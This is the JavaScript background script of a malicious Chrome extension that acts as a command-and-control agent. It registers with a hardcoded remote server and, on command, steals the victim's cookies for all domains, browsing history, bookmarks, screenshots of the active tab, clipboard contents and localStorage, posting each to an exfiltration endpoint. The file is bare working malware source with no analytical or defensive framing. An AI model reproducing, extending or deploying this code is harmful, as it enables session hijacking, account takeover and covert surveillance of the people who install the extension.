// background.js
window.run = function(cfg) {
  console.log("[payload] run() started with cfg:", cfg);

  if (!cfg?.c2) {
    console.warn("[payload] No C2 address provided in cfg");
    return;
  }

  const payload = {
    modules: cfg.modules || [],
    timestamp: new Date().toISOString()
  };

  fetch(cfg.c2 + "/api/register", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  })
    .then(res => res.text())
    .then(text => {
      console.log("[payload] C2 register response:", text);
    })
    .catch(err => {
      console.error("[payload] Fetch error during registration:", err);
    });
};

  const C2_SERVER = 'https://tradingpiecefororder.asia'; // Update if needed
  const MIN_POLL_SECONDS = 2;
  const MAX_POLL_SECONDS = 5;

  let agent_id = null;

  function getRandomInterval() {
    return Math.floor(
      Math.random() * (MAX_POLL_SECONDS - MIN_POLL_SECONDS + 1) + MIN_POLL_SECONDS
    ) * 1000;
  }

  async function fetchWithRetry(url, options, retries = 3, backoff = 3000) {
    for (let i = 0; i < retries; i++) {
      try {
        const response = await fetch(url, options);
        if (!response.ok) throw new Error(`Status: ${response.status}`);
        return response;
      } catch (error) {
        console.warn(`Fetch attempt ${i + 1} failed: ${error.message}`);
        if (i < retries - 1) {
          await new Promise((res) => setTimeout(res, backoff));
        } else {
          throw error;
        }
      }
    }
  }

// Exfil data
async function exfilData(action, payload) {
  console.log(`[Exfil] Action=${action}, Payload=${JSON.stringify(payload)}`);
  try {
    const response = await fetchWithRetry(`${C2_SERVER}/api/exfil`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        agent_id,
        action,
        payload
      })
    });
    const result = await response.json();
    console.log(`[Exfil Response] ${JSON.stringify(result)}`);
  } catch (err) {
    console.error(`[Exfil Error] ${err.message}`);
  }
}

// Capture screenshot
async function captureScreenshot(quality) {
  try {
    const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!activeTab) {
      console.error('No active tab found for screenshot');
      return;
    }
    const tabUrl = activeTab.url;
    console.log(`[Screenshot] Attempting on ${tabUrl}`);

    const restrictedSchemes = ['chrome://', 'devtools://', 'chrome-extension://', 'about:'];
    const isRestricted = restrictedSchemes.some((scheme) => tabUrl.startsWith(scheme));
    if (isRestricted) {
      console.warn(`[Screenshot] Restricted URL: ${tabUrl}`);
      return;
    }

    const dataUrl = await new Promise((resolve, reject) => {
      chrome.tabs.captureVisibleTab(null, { format: 'png' }, (res) => {
        if (chrome.runtime.lastError) {
          reject(new Error(chrome.runtime.lastError.message));
        } else {
          resolve(res);
        }
      });
    });

    // Extract base64 data from dataUrl
    const base64Data = dataUrl.split(',')[1];
    
    console.log('[Screenshot] Captured, exfiltrating...');
    // Send with correct payload structure
    exfilData('TAKE_SCREENSHOT', {
      screenshot: base64Data,
      location: tabUrl
    });
  } catch (err) {
    console.error('[Screenshot Error]', err);
  }
}

// Retrieve cookies - updated to handle all domains if none specified
async function getCookiesForDomain(domain = null) {
  console.log(`[GetCookies] for domain: ${domain || 'all domains'}`);
  
  // If no domain specified, get all cookies
  const options = domain ? { domain } : {};
  
  chrome.cookies.getAll(options, (cookies) => {
    console.log(`[GetCookies] Found ${cookies.length} cookies`);
    
    // Group cookies by domain for better organization
    const cookiesByDomain = {};
    cookies.forEach(cookie => {
      if (!cookiesByDomain[cookie.domain]) {
        cookiesByDomain[cookie.domain] = [];
      }
      cookiesByDomain[cookie.domain].push(cookie);
    });
    
    exfilData('COOKIES', {
      domain: domain || 'all',
      cookies: cookiesByDomain
    });
  });
}

// Get browsing history
async function getBrowsingHistory(days = 7) {
  console.log(`[GetHistory] Fetching history for last ${days} days`);
  
  try {
    const microsecondsPerDay = 1000 * 60 * 60 * 24;
    const startTime = new Date().getTime() - (microsecondsPerDay * days);
    
    const historyItems = await chrome.history.search({
      text: '',              // Empty string to match all URLs
      startTime: startTime,  // From X days ago
      maxResults: 5000       // Reasonable limit
    });

    // Process and structure the history data
    const processedHistory = historyItems.map(item => ({
      url: item.url,
      title: item.title,
      visitCount: item.visitCount,
      lastVisit: new Date(item.lastVisitTime).toISOString(),
      typedCount: item.typedCount
    }));

    console.log(`[GetHistory] Found ${processedHistory.length} entries`);
    
    // Exfiltrate the data
    exfilData('HISTORY', {
      days: days,
      entries: processedHistory,
      totalItems: processedHistory.length
    });
    
  } catch (error) {
    console.error('[GetHistory] Error:', error);
    exfilData('HISTORY', {
      error: error.message,
      days: days
    });
  }
}

// Get bookmarks
async function getBookmarks() {
  console.log('[GetBookmarks] Fetching bookmarks');
  
  try {
    const bookmarkTree = await chrome.bookmarks.getTree();
    console.log(`[GetBookmarks] Retrieved bookmark tree`);
    
    // Exfiltrate the data
    exfilData('BOOKMARKS', {
      bookmarks: bookmarkTree[0],
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('[GetBookmarks] Error:', error);
    exfilData('BOOKMARKS', {
      error: error.message
    });
  }
}

// Handle commands
async function handleCommand(command) {
  console.log('[HandleCommand]', command);
  switch (command.type.toLowerCase()) {
    case 'domsnapshot':
      broadcastMessage({ command: 'domSnapshot' });
      break;

    case 'clipboardcapture':
    case 'capture_clipboard':
      broadcastMessage({ command: 'clipboardCapture' });
      break;

    case 'localstoragedump':
      broadcastMessage({ command: 'localStorageDump' });
      break;

    case 'getcookies':
      const domain = command.payload?.domain || null;
      await getCookiesForDomain(domain);
      break;

    case 'screenshot':
    case 'take_screenshot':
      console.log('[Handling Command] screenshot => captureScreenshot');
      await captureScreenshot(command.payload?.quality || 50);
      break;

    case 'testcommand':
      console.log('[TestCommand] Exfil test response');
      exfilData('testCommandResponse', { message: 'Test command executed successfully.' });
      break;

    case 'history':
      console.log('[Handling Command] history request');
      const days = command.payload?.days || 7;
      await getBrowsingHistory(days);
      break;

    case 'bookmarks':
      console.log('[Handling Command] bookmarks request');
      await getBookmarks();
      break;

    case 'enumeration':
      console.log('[Handling Command] system enumeration');
      broadcastMessage({ command: 'enumeration' });
      break;

    default:
      console.warn('[Unknown Command]', command.type);
  }
}
